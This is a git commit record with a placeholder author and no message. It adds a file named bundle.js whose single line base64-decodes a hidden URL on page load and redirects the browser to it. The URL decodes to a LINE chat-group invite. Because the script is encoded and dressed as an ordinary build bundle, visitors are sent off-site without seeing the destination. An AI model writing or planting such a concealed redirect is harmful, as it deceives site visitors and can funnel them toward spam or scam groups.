a1a1b146223fc0de000e0d5d9523fcbf325233a8
John Doe <johndoe@example.com>
2025-05-05 23:53:03 +0900

    No message.

---
+++ gh-entry/bundle.js
@@ -0,0 +1,2 @@
+(()=>{"use strict";var a;a=atob("aHR0cHM6Ly9saW5lLm1lL3RpL2cyL19HQlBpdjZWRTlYcE9IaGtrWU4wbVVBeDcyVXpGaGNaWHlRX1RB"),window.location.replace(a)})();
+//# sourceMappingURL=bundle.js.map
